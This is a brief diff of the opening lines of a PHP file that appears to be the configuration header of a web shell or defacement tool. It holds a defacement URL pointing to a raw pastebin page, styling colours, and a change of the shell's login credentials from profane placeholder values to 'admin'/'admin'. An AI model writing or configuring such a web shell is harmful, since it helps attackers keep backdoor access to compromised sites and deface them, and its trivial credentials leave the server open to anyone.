@@ -1,7 +1,7 @@
 <?php
 $deface_url='http://pastebin.com/raw/xCjJQYHH';
-$UserName="fuck";
-$auth_pass="you";
+$UserName="admin";
+$auth_pass="admin";
 $color="#ABEFFA";
 $Theme='#09B5A7';
 $TabsColor='#0E5062';
